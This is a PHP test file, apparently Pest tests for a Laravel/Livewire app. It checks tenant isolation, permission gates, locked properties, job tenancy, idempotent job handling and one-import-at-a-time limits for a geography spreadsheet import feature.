    Livewire::actingAs($this->globexAdmin)->test(GeographyImport::class)->assertSet('batchId', null)->assertDontSee('geography.xlsx')
        ->call('openBatch', $acmeBatch->id)->assertNotFound();

    $this->actingAs($this->globexAdmin)->get(route('imports.errors', $acmeBatch->id))->assertNotFound();
});

it('keeps the batch id out of the browser’s hands', function () {
    geoUpload($this->admin, geoRows());
    $theirs = ImportBatch::withoutGlobalScopes(Tenancy::SCOPES)->latest('id')->firstOrFail()->id;

    expect(fn () => Livewire::actingAs($this->globexAdmin)->test(GeographyImport::class)->set('batchId', $theirs))->toThrow(CannotUpdateLockedPropertyException::class);
});

it('stops people without the import permission at every step', function () {
    geoUpload($this->admin, geoRows());
    $batch = lastBatch();

    Livewire::actingAs($this->viewer)->test(GeographyImport::class)->assertForbidden();
    $this->actingAs($this->viewer)->get(route('imports.errors', $batch->id))->assertForbidden();

    // The policy behind every wizard action: the permission alone is not enough without the company, and vice versa.
    expect(Gate::forUser($this->viewer)->denies('view', $batch))->toBeTrue()
        ->and(Gate::forUser($this->viewer)->denies('manage', $batch))->toBeTrue()
        ->and(Gate::forUser($this->globexAdmin)->denies('view', $batch))->toBeTrue()
        ->and(Gate::forUser($this->globexAdmin)->denies('manage', $batch))->toBeTrue()
        ->and(Gate::forUser($this->admin)->allows('manage', $batch))->toBeTrue()
        ->and($batch->fresh()->status)->toBe(ImportStatus::Checked);
});

it('runs the job inside the company it was queued for', function () {
    geoUpload($this->admin, geoRows());
    $batch = lastBatch();
    $batch->forceFill(['status' => ImportStatus::Checking])->save();

    // Queued for the wrong company, the job cannot even see the batch.
    ProcessImportBatch::dispatchSync($batch->id, $this->globex->id, 'check');
    expect($batch->fresh()->status)->toBe(ImportStatus::Checking);

    // And for a company that does not exist it refuses outright.
    expect(fn () => ProcessImportBatch::dispatchSync($batch->id, 999999, 'check'))->toThrow(TenantAccessException::class);

    ProcessImportBatch::dispatchSync($batch->id, $this->acme->id, 'check');
    expect($batch->fresh()->status)->toBe(ImportStatus::Checked);
});

it('ignores a duplicate delivery of the same job', function () {
    geoUpload($this->admin, geoRows())->call('confirmImport');
    $batch = lastBatch();
    $after = geoCounts($this->acme->id);

    ProcessImportBatch::dispatchSync($batch->id, $this->acme->id, 'apply');
    ProcessImportBatch::dispatchSync($batch->id, $this->acme->id, 'check');

    expect($batch->fresh())->status->toBe(ImportStatus::Completed)->and(geoCounts($this->acme->id))->toBe($after)
        ->and(ActivityLog::withoutGlobalScopes()->where('event', 'import_completed')->count())->toBe(1);
});

it('lets only one import per company run at a time', function () {
    geoUpload($this->admin, geoRows());
    $firstBatch = lastBatch();
    $second = geoUpload($this->admin, [['Gujarat', 'Rajkot', 'Kotda', '360002', '']]);
    $secondBatch = lastBatch();

    $firstBatch->forceFill(['status' => ImportStatus::Processing])->save();   // the first is mid-flight
    $second->call('confirmImport')->assertHasErrors(['batch']);

    expect($secondBatch->fresh()->status)->toBe(ImportStatus::Checked);
});
